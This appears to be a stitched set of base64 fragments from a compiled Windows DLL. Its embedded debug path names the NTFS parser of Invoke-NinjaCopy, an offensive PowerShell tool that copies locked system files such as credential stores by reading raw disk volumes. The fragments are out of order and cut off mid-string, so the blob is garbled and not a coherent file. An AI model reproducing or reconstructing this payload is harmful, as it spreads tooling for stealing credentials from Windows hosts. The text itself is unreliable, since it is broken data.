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','AAAAAAAABAAAA/////xDpABAiBZMZAQAAAMBZARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////4OkAECIFkxkCAAAA7FkBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////8Q6gAQAAAAABvqABAiBZMZAgAAACBaARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////8OcAEAAAAAD45wAQIgWTGQEAAABUWgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////yDoABAiBZMZAgAAAIBaARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////wOcAEAAAAADI5wAQIgWTGQIAAAC0WgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////5DnABAAAAAAmOcAEOxaAQAAAAAAAAAAAHJcAQAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8WwEAElwBACRcAQA0XAEAQFwBAFZcAQBkXAEAgFwBAJBcAQCgXAEAtFwBANBcAQDiXAEA+FwBAApdAQAWXQEALl0BA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','//AAAAAP7///8AAAAAsoIAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAAAzhAAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAAGIABD+////AAAAAA2IABD+////AAAAANj///8AAAAA/v///wAAAABxiQAQ/v///wAAAACAiQAQ/v///wAAAADY////AAAAAP7///+ijQAQpo0AEAAAAAD+////AAAAANj///8AAAAA/v///26NABByjQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAANKOABAAAAAA/v///wAAAAB8////AAAAAP7///8AAAAA86IAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABFtAAQAAAAAAq','IALQBiAGEALQBsAGEAdABuAAAAAABzAHIALQBzAHAALQBjAHkAcgBsAAAAAABzAHIALQBzAHAALQBsAGEAdABuAAAAAABzAHYALQBmAGkAAABzAHYALQBzAGUAAABzAHcALQBrAGUAAABzAHkAcgAtAHMAeQAAAAAAdABhAC0AaQBuAAAAdABlAC0AaQBuAAAAdABoAC0AdABoAAAAdABuAC0AegBhAAAAdAByAC0AdAByAAAAdAB0AC0AcgB1AAAAdQBrAC0AdQBhAAAAdQByAC0AcABrAAAAdQB6AC0AdQB6AC0AYwB5AHIAbAAAAAAAdQB6AC0AdQB6AC0AbABhAHQAbgAAAAAAdgBpAC0AdgBuAAAAeABoAC0AegBhAAAAegBoAC0AYwBoAHMAAAAAAHoAaAAtAGM','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c/3EY/3Eo6BX///+DxAxdwgQAVVZXU4vqM8Az2zPSM/Yz///RW19eXcOL6ovxi8FqAeivHgAAM8Az2zPJM9Iz///mVYvsU1ZXagBSaFa9ABBR6OgoAABfXltdw1WLbCQIUlH/dCQU6LX+//+DxAxdwggAVYvsVleLfQiF/3QTi00Mhcl0DItVEIXSdRozwGaJB+jO4P//ahZeiTDoltL//4vGX15dw4v3ZoM+AHQGg8YCSXX0hcl01CvyD7cCZokEFo1SAmaFwHQDSXXuM8CFyX','DxdAQBSXQEAZF0BAHBdAQB4XQEAiF0BAJRdAQCqXQEAtl0BAMJdAQDaXQEA7F0BAPZdAQACXgEADl4BACBeAQAwXgEATF4BAGpeAQCSXgEApl4BALpeAQDGXgEA1F4BAOJeAQDsXgEA/l4BABJfAQAkXwEAMl8BAEpfAQBgXwEAel8BAJBfAQCqXwEAxF8BAN5fAQD2XwEADmABACBgAQAuYAEARGABAFRgAQBkYAEAdGABAIZgAQCaYAEAqmABALpgAQDOYAEAAAAAABEFV2lkZUNoYXJUb011bHRpQnl0ZQBmBFNldEZpbGVQb2lu','cnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/QQAAABcAAABDAE8ATgBPAFUAVAAkAAAABoCAhoCBgAAAEAOGgIaCgBQFBUVFRYWFhQUAADAwgFCAiAAIACgnOFBXgAAHADcwMFBQiAAAACAogIiAgAAAAGBoYGhoaAgIB3hwcHdwcAgIAAAIAAgABwgAAABnZW5lcmljAHVua25vd24gZXJyb3IAAABpb3N0cmVhbQAAAABpb3N0cmVhbSBzdHJlYW0gZXJyb3IAAABzeXN0ZW0AAGludmFsaWQgc3RyaW5nIHBvc2l0aW9uAHN0cmluZyB0b28gbG9uZwBcXC5cJWM6AE5URlMgICAgAAAAAJxOARBwTgAQgBcAEJAXABCwFwAQsE4BEABOABBwHQAQgB0AELAdABDsTgEQkE0AEIAXABCQFwAQsBcAEABPARDwTAAQcB0AEIAdABCwHQAQxE4BEOAWABCAFwAQkBcAELAXABDYTgEQ8BgAEHAdABCAHQAQsB0AEBRPARDwRAAQGFABEMBEABAsUAEQkEQAEEBQARBgRAAQaFABENA8ABBUUAEQQC0AEChPARDwGAAQcB0AEIAdABCwHQAQPE8BEKhOABBQTwEQwCgAEIAXABCQFwAQsBcAEGRPARCgJwAQfFABECAnABB4TwEQYCUAEIAXABCQFwAQsBcAEIxPARDgFgAQgBcAEJAXABCwFwAQoE8BELBOABC0TwEQoCMAEIAXABCQFwAQsBcAEMhPARDgHwAQ3E8BEOAWABCAFwAQkBcAELAXABDwTwEQ8BgAEHAdABCAHQAQsB0AEARQARDgFgAQgBcAEJAXABCwFwAQkFABEOAWABD+VwAQ/lcAEP5XABBIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAcAEQsFABEBcAAABSU0RTKhjahWztyU+JA8UQjfEHSAEAAABDOlxHaXRodWJcUG93ZXJTaGVsbFxJbnZva2UtTmluamFDb3B5XE5URlNQYXJzZXJcUmVsZWFzZVxOVEZTUGFyc2VyRExMLnBkYgAAAAAAAI0AAACNAAAAAAAAABxwARAAAAAAAAAAAP////8AAAAAQAAAAOBFARAAAAAAAAAAAAEAAADwRQEQxEUBEAAAAAAAAAAAAAAAAAAAAAAAcAEQDEYBEAAAAAAAAAAAAgAAABxGARAoRgEQxEUBEAAAAAAAcAEQAQAAAAAAAAD/////AAAAAEAAAAAMRgEQAAAAAAAAAAAAAAAAOHABEFhGARAAAAAAAAAAAAIAAABoRgEQdEYBEMRFARAAAAAAOHABEAEAAAAAAAAA/////wAAAABAAAAAWEYBEAAAAAAAAAAAAAAAAFhwARCkRgEQAAAAAAAAAAADAAAAtEYBEMRGARB0RgEQxEUBEAAAAABYcAEQAgAAAAAAAAD/////AAAAAEAAAACkRgEQAAAAAAAAAAAAAAAAeHABEPRGARAAAAAAAAAAAAMAAAAERwEQFEcBEHRGARDERQEQAAAAAHhwARACAAAAAAAAAP////8AAAAAQAAAAPRGARAAAAAAAAAAAAAAAACgcAEQREcBEAAAAAAAAAAAAQAAAFRHARBcRwEQAAAAAKBwARAAAAAAAAAAAP////8AAAAAQAAAAERHARAAAAAAAAAAAAAAAAAccAEQ4EUBEAAAAAAAAAAAAAAAAPB5ARCgRwEQAAAAAAAAAAACAAAAsEcBELxHARDERQEQAAAAAPB5ARABAAAAAAAAAP////8AAAAAQAAAAKBHARAAAAAAAAAAAAEAAACYSAEQyH4BEAAAAAAAAAAA/////wAAAABAAAAA2EcBEAAAAAAAAAAAAwAAABRIARCgSAEQOEgBE','dBeLd2iF9nUIaiDoou///1mLxuiC8///w2oN6JgzAABZg2X8AIt3aIl15Ds14HABEHQ2hfZ0Glb/FTzwABCFwHUPgf7gcwEQdAdW6IH3//9ZoeBwARCJR2iLNeBwARCJdeRW/xVo8AAQx0X8/v///+gFAAAA646LdeRqDeibNAAAWcNqEGhIUwEQ6Mby//+Dz//ofQUAAIvYiV3k6D3///+Lc2j/dQjoz/z//1mJRQg7RgQPhG4BAABoIAIAAOjx8f//WYvYhdsPhFsBAAC5iAAAAItF5ItwaIv786Uz9okzU/91COhHAQAAWVmL+Il9CIX/D4UNAQAAi0Xk/3Bo/xU88AAQhcCLReR1FYtIaIH54HMBEHQKUei09v//WYtF5IlYaFP/FWjwABCLReT2QHACD4XxAAAA9gUseAEQAQ+F5AAAAGoN6GwyAABZiXX8i0MEozyMARCLQwijQIwBEIuDHAIAAKM4jAEQi86JTeCD+QV9EGaLREsMZokETUSMARBB6+iLzolN4IH5AQEAAH0NikQZGIiB2HEBEEHr6Il14IH+AAEAAH0QioQeGQEAAIiG4HIBEEbr5f814HABEP8VPPAAEIXAdROh4HABED3gcwEQdAdQ6PX1//9ZiR3gcAEQU/8VaPAAEMdF/P7////oBQAAAOsxi30Iag3oGj','0DYPACIN4BAB18zPAXcOLQARdw1WL7Fb/dQiL8ehVHwAAxwZk/wAQi8ZeXcIEAFWL7Fb/dQiL8eg6HwAAxwaM/wAQi8ZeXcIE','A1ARA4NQEQRDUBEFA1ARBaNQEQCDoBEBw6ARA4OgEQTDoBEGw6ARBcNQEQZDUBEGw1ARBwNQEQdDUBEHg1ARB8NQEQgDUBEIQ1ARCINQEQlDUBEJg1ARCcNQEQoDUBEKQ1ARCoNQEQrDUBELA1ARC0NQEQuDUBELw1ARDANQEQxDUBEMg1ARDMNQEQ0DUBENQ1ARDYNQEQ3DUBEOA1ARDkNQEQ6DUBEOw1ARDwNQEQ9DUBEPg1ARD8NQEQADYBEAQ2ARAINgEQDDYB','GQsIE1NTU0gZGQsIHl5eXkASEg6bW06c3MAAAAAUwB1AG4AAABNAG8AbgAAAFQAdQBlAAAAVwBlAGQAAABUAGgAdQAAAEYAcgBpAAAAUwBhAHQAAABTAHUAbgBkAGEAeQAAAAAATQBvAG4AZABhAHkAAAAAAFQAdQBlAHMAZABhAHkAAABXAGUAZABuAGUAcwBkAGEAeQAAAFQAaAB1AHIAcwBkAGEAeQAAAAAARgByAGkAZABhAHkAAAAAAFMAYQB0AHUAcgBkAGEAeQAAAAAASgBhAG4AAABGAGUAYgAAAE0AYQByAAAAQQBwAHIAAABNAGEAeQAAAEoAdQBuAAAASgB1AGwAAABBAHUAZwAAAFMAZQBwAAAATwBjAHQAAABOAG8AdgAAAEQAZQBjAAAASgBhAG4AdQBhAHIAeQAAAEYAZQBiAHIAdQBhAHIAeQAAAAAATQBhAHIAYwBoAAAAQQBwAHIAaQBsAAAASgB1AG4AZQAAAAAASgB1AGwAeQAAAAAAQQB1AGcAdQBzAHQAAAAAAFMAZQBwAHQAZQBtAGIAZQByAAAATwBjAHQAbwBiAGUAcgAAAE4AbwB2AGUAbQBiAGUAcgAAAAAARABlAGMAZQBtAGIAZQByAAAAAABBAE0AAAAAAFAATQAAAAAATQBNAC8AZABkAC8AeQB5AAAAAABkAGQAZABkACwAIABNAE0ATQBNACAAZABkACwAIAB5AHkAeQB5AAAASABIADoAbQBtADoAcwBzAAAAAABlAG4ALQBVAFMAAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAARmxzQWxsb2MAAAAARmxzRnJlZQBGbHNHZXRWYWx1ZQBGbHNTZXRWYWx1ZQBJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAQ3JlYXRlU2VtYXBob3JlRXhXAABTZXRUaHJlYWRTdGFja0d1YXJhbnRlZQBDcmVhdGVUaHJlYWRwb29sVGltZXIAAABTZXRUaHJlYWRwb29sVGltZXIAAFdhaXRGb3JUaHJlYWRwb29sVGltZXJDYWxsYmFja3MAQ2xvc2VUaHJlYWRwb29sVGltZXIAAAAAQ3JlYXRlVGhyZWFkcG9vbFdhaXQAAAAAU2V0VGhyZWFkcG9vbFdhaXQAAABDbG9zZVRocmVhZHBvb2xXYWl0AEZsdXNoUHJvY2Vzc1dyaXRlQnVmZmVycwAAAABGcmVlTGlicmFyeVdoZW5DYWxsYmFja1JldHVybnMAAEdldEN1cnJlbnRQcm9jZXNzb3JOdW1iZXIAAABHZXRMb2dpY2FsUHJvY2Vzc29ySW5mb3JtYXRpb24AAENyZWF0ZVN5bWJvbGljTGlua1cAU2V0RGVmYXVsdERsbERpcmVjdG9yaWVzAAAAAEVudW1TeXN0ZW1Mb2NhbGVzRXgAQ29tcGFyZVN0cmluZ0V4AEdldERhdGVGb3JtYXRFeABHZXRMb2NhbGVJbmZvRXgAR2V0VGltZUZvcm1hdEV4AEdldFVzZXJEZWZhdWx0TG9jYWxlTmFtZQAAAABJc1ZhbGlkTG9jYWxlTmFtZQAAAExDTWFwU3RyaW5nRXgAAABHZXRDdXJyZW50UGFja2FnZUlkAAAAAAABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk','zMzMzMzMzMxVi+xTVot1DDPSV4v5hfZ+JotdFItFCA+3TwjR6Y0ESGaLTRBmOUj+dRlmiwxTQmaJSP471nzgX164AQAAAFtdwhAAX14zwFtdwhAAzMzMzFWL7Gr/aOvpABBkoQAAAABQg+wUU1ZXocBwARAzxVCNRfRkowAAAACL8Yl18ItNCItBBDtGRHIRD4drAQAAiwE7RkAPg2ABAACLfQyLXhCDfwQAfgeLz+ikFwAAi0cUhcB0CVDovywAAIPEBFPo5yQAAIvYi0XwiV8UD7dICIt2EDPSi8b','AABmD29O9I129GYPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QxmD38fZg9v4GYPOg/CDGYPf0cQZg9vzWYPOg/sDGYPf28gjX8wfbeNdgzprwAAAGYPb074jXb4jUkAZg9vXhCD6TBmD29GIGYPb24wjXYwg/kwZg9v02YPOg/ZCGYPfx9mD2/gZg86D8IIZg9/RxBmD2/NZg86D+wIZg9/byCNfzB9t412COtWZg9vTvyNdvyL/2YPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QRmD38fZg9v4GYPOg/CBGYPf0cQZg9vzWYPOg/sBGYPf28gjX8wfbeNdgSD+RB8E/MPbw6D6RCNdhBmD38PjX8Q6+gPuuECcw2LBoPpBI12BIkHjX8ED7rhA3MR8w9+DoPpCI12CGYP1g+NfwiLBI24UwAQ/+D3xwMAAAB1FcHpAoPiA4P5CHIq86X/JJW4UwAQkIvHugMAAACD6QRyDIPgAwPI/ySFzFIAEP8kjchTABCQ/ySNTFMAEJDcUgAQCFMAECxTABAj0YoGiAeKRgGIRwGKRgLB6QKIRwKDxgODxwOD+QhyzPOl/ySVuFMAEI1JACPRigaIB4pGAcHpAohHAYPGAoPHAoP5CHKm86X/JJW4UwAQkCPRigaIB4PGAcHpAoPHAYP5CHKI86X/JJW4UwAQjUkAr1MAEJxTABCUUwAQjFMAEIRTABB8UwAQdFMAEGxTABCLRI7kiUSP5ItEjuiJRI/oi0SO7IlEj+yLRI7wiUSP8ItEjvSJRI/0i0SO+IlEj/iLRI78iUSP/I0EjQAAAAAD8AP4/ySVuFMAEIv/yFMAENBTABDcUwAQ8FMAEItEJAxeX8OQigaIB4tEJAxeX8OQigaIB4pGAYhHAYtEJAxeX8ONSQCKBogHikYBiEcBikYCiEcCi0QkDF5fw5CNdDH8jXw5/PfHAwAAAHUkwekCg+IDg/kIcg3986X8/ySVVFUAEIv/99n/JI0EVQAQjUkAi8e6AwAAAIP5BHIMg+ADK8j/JIVYVAAQ/ySNVFUAEJBoVAAQjFQAELRUABCKRgMj0YhHA4PuAcHpAoPvAYP5CHKy/fOl/P8klVRVABCNSQCKRgMj0YhHA4pGAsHpAohHAoPuAoPvAoP5CHKI/fOl/P8klVRVABCQikYDI9GIRwOKRgKIRwKKRgHB6QKIRwGD7gOD7wOD+QgPglb////986X8/ySVVFUAEI1JAAhVABAQVQAQGFUAECBVABAoVQAQMFUAEDhVABBLVQAQi0SOHIlEjxyLRI4YiUSPGItEjhSJRI8Ui0SOEIlEjxCLRI4MiUSPDItEjgiJRI8Ii0SOBIlEjwSNBI0','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA